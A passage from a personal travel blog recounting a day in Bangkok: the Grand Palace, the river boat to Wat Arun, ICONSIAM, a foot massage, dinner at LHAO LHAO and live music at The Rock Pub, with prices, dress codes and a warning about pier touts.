lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Yaksha and Monkey![](/assets/b7e7c0938985/1*j5iCvZTXTYF40wqTFMqx_w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![Phra Kaew Morakot Chedi](/assets/b7e7c0938985/1*3XuAmth-2yp95PTza23joQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Phra Kaew Morakot Chedi![](/assets/b7e7c0938985/1*qdZdH9QoxvFSqx0LZOi9DQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*WTdZzvf21ffP1cT2HwgoTw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![Ramakien Mural](/assets/b7e7c0938985/1*7ghYSZnj3C69IcbO8wtZ0w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Ramakien Mural![**Image Source: Trueplookpanya**](/assets/b7e7c0938985/1*KlgTC5eNwIJcuI3tAsE1zw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjU4MCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }**Image Source: Trueplookpanya**&gt; **_⚠️ No photography allowed at Wat Phra Kaew ⚠️_** &gt; _The clothing varies by season; this time I saw the second type of attire._ ![Grand Palace](/assets/b7e7c0938985/1*T81VgTZqp_v5PdjJIRLLFg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Grand Palace#### 13:20 Lunch![](/assets/b7e7c0938985/1*pnqEFQsVU3lSHkvBxfQphQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*NVu8tXAG7D3sGNRQi-PHGw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Around 13:00, after exiting the Grand Palace, we found a Western restaurant nearby towards the pier to have lunch.#### 14:00 Preparing to take the boat to Wat Arun![](/assets/b7e7c0938985/1*ePMFJ1jf5orPQRQTEJHMnQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*HtIAOV8myKTKvIckI39XxQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*J5lIB0rYWPqPWrgkkNlB2g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }&gt; **_⚠️ There will be people outside the pier trying to solicit you, be careful as they are private boat operators, charging high fees (THB 500, 1000) and are not safe; ignore them and find the official pier, tell the counter where you want to go._ ⚠️_** &gt; **_The official ticket price is only THB 30 (from `Tha Chang` to Wat Arun), the new boats have air conditioning, are safe, and comfortable._** ![](/assets/b7e7c0938985/1*oc8bbW-4ZZwQeFkqNhXwNw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*ccUJ7WKGfb73k8UWEDNesg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }When the boat arrives, the staff will announce \"Wat Arun\" (yes, in Chinese), and you can ask anytime if you're unsure.---title: Bangkok Trip Reportdate: 2023-08-03---The time is approaching the afternoon thunderstorm, and you can see the water flowing muddy and swift.![](/assets/b7e7c0938985/1*8hMHmiUOANTISYOVpTISiA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The boat is very new, the air conditioning is cool, it's very safe in the enclosed space, and there are quite a few departures, making it very convenient!When you arrive, the staff will also announce \"Wat Arun.\"#### 14:30 Arrive at Wat ArunTicket price: THB 200![](/assets/b7e7c0938985/1*yO651kLqUcD8FPfH2KH1Sw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*ujWr_UkXTX__M2jEz06sUw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After disembarking, you will be at Wat Arun, where you can directly queue to buy tickets for entry.&gt; **_⚠️ Wat Arun also has a dress code ⚠️_** &gt; **_No bare shoulders, shorts, exposed midriffs, or short skirts._** &gt; **_You can wear traditional Thai clothing; many people wear it for photos._** ![](/assets/b7e7c0938985/1*uJWVDd2xTKpqeMsGV1B-5Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjE5NTEiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }![](/assets/b7e7c0938985/1*uEVN2N7iC5oHzcuj-I-XDg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*-0skUN7uZif2LhzvjD8lAQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }You can walk to the middle platform for photos (⚠️ the stairs are steep, so be careful). Many people also change into traditional Thai clothing here for memorable photos.&gt; **_👉👉👉 KKday Experience Recommendations:_** &gt; **_\\- [Thai Costume Experience with Photo Tour at Wat Arun in Bangkok](https://www.kkday.com/zh-tw/product/138442-thai-costume-experience-with-photo-tour-at-wat-arun-in-bangkok-thailand?cid=15925&amp;ud1=PMax2024&amp;ud2=JulBank){:target=\"_blank\"}_** &gt; **_\\- [3-Hour Walking Tour of Wat Pho and Wat Arun](https://www.kkday.com/zh-tw/product/131601-grand-palace-wat-phra-kaew-90-minutes-guided-walking-tour-bangkok?cid=19365){:target=\"_blank\"}_** ![](/assets/b7e7c0938985/1*pHVP5jqovyBTaNQPnnRLVQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*fO6kb4ktSiOdbP3SBfrhvA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4NjIiIGhlaWdodD0iMTEwNSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After the visit, return to the pier and find the ticket booth (PIER 2) to buy a ticket for the boat to ICONSIAM (THB 40), then head to PIER 1 to board.![](/assets/b7e7c0938985/1*irpIgl1xUwnXxEsmHE6YvA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*nPFiNzj_1pl4Mt3PKaWJ5g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }It's also a comfortable and safe new boat!#### 15:00 ICONSIAM![](/assets/b7e7c0938985/1*ms25D3MjSN_Mjxmlf7l4Yg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjkzOSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*MbiMV91xnwXQqSTg4UUx1g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }ICONSIAM is very large and looks luxurious, with a unique food court on the first floor.![](/assets/b7e7c0938985/1*fuuOJMUI4D8F0zPOEH1geg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjEwMDciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }![](/assets/b7e7c0938985/1*eLZgR_Wmmnt0oWkwO-d-KQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }I bought a cup of ChaTraMue hand-brewed Thai milk tea to recharge.![](/assets/b7e7c0938985/1*rlw0X5JSHt_I_EHl-uhuNw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*P-p65azTMpWowyRbZuyxhQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9Ijg0OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }I strolled to the BTS Charoen Nakhon platform, thinking of getting a foot massage for an hour.There was a relatively new and large place (1) THAI GARDEN MASSAGE outside the station, but they were fully booked; fortunately, I continued walking to (2) another massage shop as shown in the picture; I found it very comfortable, less crowded, spacious, and quieter, with affordable rates (foot massage/1 hour/THB 270).![](/assets/b7e7c0938985/1*ddoyaApVC_hDVlVULWkU4w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*_ER_cZ5ZUNPbhOZMPEHufg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MTYiIGhlaWdodD0iMTE5OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*s6--mVkXnO3wqrcTHRgL0Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MjciIGhlaWdodD0iMTE1OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After the massage, I had the energy to continue shopping, returning to ICONSIAM; I walked to the restaurant upstairs, which was also quite extravagant, featuring a jungle, small bridges, and waterfalls, overall very nice!&gt; _I bought the famous Japanese fries TORO FRIES (the line was long) to recharge._ &gt; _They also have Japanese % coffee here._ #### Heading to LHAO LHAO for Dinner![](/assets/b7e7c0938985/1*d21DfDD2xpEAa46nWvWv8g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMzMwIiBoZWlnaHQ9IjIzNjQiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }![](/assets/b7e7c0938985/1*KaOa1H5X5kAJ9k0scrcOSg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*FkVlLZzqOg0Q3j30Jvvppg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MTYiIGhlaWdodD0iMjcxIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }This line is a branch with only three stations and less frequent service.&gt; _Google Maps seems to have no information about this BTS line; it suggested I walk to Krung Thon Buri._ From here, taking one stop to Krung Thon Buri connects to the Silom Line.![](/assets/b7e7c0938985/1*QmUb_NsqoSJaBOueWCoUFw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjkwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![Bangkok also has LAWSON!](/assets/b7e7c0938985/1*CxR4vawFCsqtFfpAtFdG9w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Bangkok also has LAWSON!![](/assets/b7e7c0938985/1*KRsNP-hx-bYszyg6sEzItw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*byUHBJGqYTfNZH6yzQM7Iw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }At Siam, I switched to the Sukhumvit Line and got off at Ari Station, where LHAO LHAO restaurant is just a short walk away.#### 19:00 [LHAO LHAO](https://bkk.com.tw/2012-12-12-186/#LHAO_LHAO_%E7%A8%80%E9%A3%AF%EF%BC%88%E0%B8%82%E0%B9%89%E0%B8%B2%E0%B8%A7%E0%B8%95%E0%B9%8D%E0%B8%A1%E0%B9%82%E0%B8%95%E0%B9%8A%E0%B8%A3%E0%B8%B8%E0%B9%88%E0%B8%87%E0%B9%80%E0%B8%AB%E0%B8%A5%E0%B8%B2%E0%B9%80%E0%B8%AB%E0%B8%A5%E0%B8%B2%EF%BC%89){:target=\"_blank\"}![](/assets/b7e7c0938985/1*0UPpd6AYxtFlXVR2V5hMng.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*NBIAjcZcJStuEHnFbljMUQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*ZdD45udASCT1oaUmK7VR9g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*ZMrKeHEC_DVK1oFWAS_6Wg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*tK_44yQM2NfH6rqJTjtz3g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*2EeTw8isUKicf8S-UYDiMw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The owner seems to be Chinese, and it feels like a fusion of Chinese and Thai cuisine. It's a highly-rated old restaurant, and it seems to be a favorite of Blackpink's LISA.Since I had to go to a pub to listen to live music later, I ate a bit quickly, but I found every dish very delicious!!- In the first three pictures, the background of the goose brand cooling balm, which looks like minced meat, is called หมูสับผัดหนำเลี้ยบ, which seems to be stir-fried minced meat with olive vegetables? It's very good with rice!- In the second picture, the fried oyster omelet, similar to the fried oyster omelet from Shilin Night Market in Taiwan.- In the second picture, the seasonal limited drink, longan tea.- In the second picture, the most special dish, curry crab (Panang Curry), is made with a whole fresh crab.&gt; _The goose brand cooling balm recommended by Thais; I later bought a jar that smells smoother than the menthol nasal stick and has less nasal irritation!_ #### 20:00 [The Rock Pub](https://www.instagram.com/therockpub/){:target=\"_blank\"}After eating, I headed to The Rock Pub for drinks and live music.**Activities of the Day:**![[https://www\\.instagram\\.com/p/C91ZVwtxR32/](https://www.instagram.com/p/C91ZVwtxR32/){:target=\"_blank\"}](/assets/b7e7c0938985/1*dx_5KE9edGyS0yxPHIuxig.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0NzUiIGhlaWdodD0iNTg3Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }[https://www\\.instagram\\.com/p/C91ZVwtxR32/](https://www.instagram.com/p/C91ZVwtxR32/){:target=\"_blank\"}Rundown:• 20.00-21.00: A LIKELY LAD(Kings Of Leon/Blur/Arcade Fire and more)• 21.15-22.15: COUNTING DUCKS(Radiohead/The Strokes/The Killers and more)• 22.30-00.00 : THE CHOCOLATE COSMOS(Arctic Monkeys/Joy Division/The Cure/The Smiths and more)• 00.15-01.15: LIAM FT. HENSHIN(Oasis and more)Price: THB 350 includes one drink (alcohol), **tickets must be purchased in advance**.![](/assets/b7e7c0938985/1*96uwrnoPSPl_f8zD2ObXZQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*2G8hVaN6hniAKv4iw802qQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*K1bqqyyBRNtO3FXAHl8LNQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }&gt; _I learned a fun fact about Thailand: you can't take photos of alcohol labels because it may encourage drinking, so you should cover the label as shown in picture 3._ Four performances, all rock and classic old songs!I heard songs from: Coldplay, Radiohead, Kings of Leon, Arcade Fire, Oasis, The Killers...[](https://www.youtube.com/watch?v=VLRqPAWgjko){:target=\"_blank\"}[](https://www.youtube.com/watch?v=0B3a3K4l_mU){:target=\"_blank\"}[](https://www.youtube.com/watch?v=WA9d3Q0qnhE){:target=\"_blank\"}We left around 23:00 as it was getting late, but the whole performance was of very high quality! Whether it was the singing skills or the live performance, I thought it was amazing! Very impressive!![](/assets/b7e7c0938985/1*yiolgu4UKf2_giMwEGAZAg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After returning to the hotel and giving [Chun-Hsiu Liu](https://medium.com/u/72361fccaa43){:target=\"_blank\"} some Taiwanese souvenirs, we dispersed to rest.### 8/04 Day 3 Chatuchak Market, King Power Mahanakhon, Central Rama 9#### 9:30 Breakfast: Wang Chun Sheng Beef Hot Pot, Beef Offal Hot Pot![](/assets/b7e7c0938985/1*94LoCfTj-ZuAl4N3If9-3A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MjkiIGhlaWdodD0iMTE0OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*dWkURmfpmokgpg7N-IKyZw.webp){: 